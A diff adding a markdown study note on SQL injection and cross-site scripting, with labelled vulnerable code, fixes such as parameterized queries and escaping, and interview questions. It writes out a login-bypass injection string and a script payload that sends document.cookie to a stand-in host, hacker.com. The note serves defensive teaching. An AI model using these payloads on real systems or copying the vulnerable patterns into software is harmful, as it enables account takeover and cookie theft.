@@ -1,0 +1,64 @@
+---
+title: "SQL Injection & XSS"
+description: "The two most common ways to hack an application."
+importance: "HIGH"
+revisionTime: 5
+category: "System Design"
+subcategory: "Security"
+order: 65
+---
+
+## Concept
+
+Never trust user input. If your application provides a text box, a malicious user will attempt to type code into that text box hoping your server or another user's browser accidentally executes it.
+- **SQL Injection (SQLi):** Attacking the Backend Database.
+- **Cross-Site Scripting (XSS):** Attacking the Frontend Browser.
+
+## 1. SQL Injection (Backend Attack)
+
+**The Vulnerability:**
+You have a login form. The Node.js server receives the username and blindly concatenates it into a raw string to query the database.
+```javascript
+// BAD CODE
+const query = "SELECT * FROM users WHERE username = '" + req.body.username + "'";
+```
+**The Attack:**
+The hacker types this into the username field: `admin' OR '1'='1`
+The server blindly constructs this string:
+`SELECT * FROM users WHERE username = 'admin' OR '1'='1'`
+Because `1=1` is mathematically always true, the database ignores the password check, evaluates the entire query as true, and logs the hacker into the admin account.
+
+**The Fix: Parameterized Queries (Prepared Statements)**
+You must never concatenate strings. You must use the database driver's built-in parameters. The driver separates the structure of the SQL query from the actual data payload.
+```javascript
+// GOOD CODE
+const query = "SELECT * FROM users WHERE username = $1";
+db.execute(query, [req.body.username]);
+```
+Even if the user types SQL code, the database treats it purely as a harmless string literal.
+
+## 2. Cross-Site Scripting (XSS) (Frontend Attack)
+
+**The Vulnerability:**
+Your website allows users to leave comments. You take the comment from the database and inject it directly into the HTML of the page.
+```javascript
+// BAD CODE
+document.getElementById('comments').innerHTML = db_comment;
+```
+**The Attack:**
+The hacker leaves a comment containing raw Javascript:
+`<script>fetch('http://hacker.com?cookie=' + document.cookie)</script>`
+When other users visit the page to read the comments, their browser sees the `<script>` tag, assumes it's part of the website's code, and executes it. The script instantly steals their session cookies and sends them to the hacker.
+
+**The Fix: Escaping and Sanitization**
+You must encode special characters before rendering them in the DOM. Modern frameworks like React do this automatically. If you type `<script>` in React, it converts it to `&lt;script&gt;`, rendering it harmlessly as text on the screen rather than executable code.
+
+## Interview Questions
+
+**Q: React automatically escapes all variables to prevent XSS. Under what specific circumstance can you still get hacked by XSS in a React application?**
+**A:** If you explicitly tell React to bypass its security mechanisms using the `dangerouslySetInnerHTML` prop. This is sometimes required if you are rendering rich text (like Markdown or HTML emails from a database). If you use this prop, you must run the incoming string through a specialized sanitizer library (like `DOMPurify`) to aggressively strip out `<script>` tags *before* passing it to React.
+
+**Q: A hacker is trying to execute a Stored XSS attack. Explain the difference between "Stored XSS" and "Reflected XSS".**
+**A:** 
+- **Stored XSS:** The hacker submits the malicious Javascript payload to the server (e.g., in a forum post). The server saves it to the database. Every single user who visits that forum page gets infected. It is highly devastating and permanent.
+- **Reflected XSS:** The payload is embedded directly in the URL (e.g., `http://my-bank.com/search?q=<script>...`). The server reads the URL and immediately "reflects" the malicious script back onto the screen. To attack someone, the hacker must trick a victim into clicking the malicious link (often via a phishing email). It does not affect the database.
